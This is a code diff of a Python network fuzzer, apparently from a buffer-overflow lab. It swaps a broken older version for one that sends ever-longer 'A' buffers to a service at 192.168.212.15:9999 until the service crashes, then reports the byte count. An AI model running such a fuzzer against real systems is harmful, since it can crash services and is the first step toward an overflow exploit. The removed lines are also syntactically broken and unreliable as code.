@@ -1,21 +1,21 @@
 #!/usr/bin/python
-import time, socket
-# Create a string, fuzz from ilength (initial length) to tlength
-# (target length), with increments of 500 (increment).
-buffer=”A”
-ilength=100
-tlength=2000
-increment=500
-
-
-for x in range(increment,tlength,increment):
-print(“Fuzzing with %s bytes” % x)
-buffer = “A”*x
-print(buffer)
-s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connect=s.connect((‘IP’,PORT)) # Change to target 
-time.sleep(1)
-s.send(buffer + “\r\n”);
-s.close()
-
-x += increment
+ 
+import sys, socket
+from time import sleep
+ 
+buffer = "A" * 100
+ 
+while True:
+    try:
+        payload = buffer
+ 
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(('192.168.212.15',9999))
+        print ("[+] Sending the payload...\n" + str(len(buffer)))
+        s.send((payload.encode()))
+        s.close()
+        sleep(1)
+        buffer = buffer + "A"*100
+    except:
+        print ("The fuzzing crashed at %s bytes" % str(len(buffer)))
+        sys.exit()
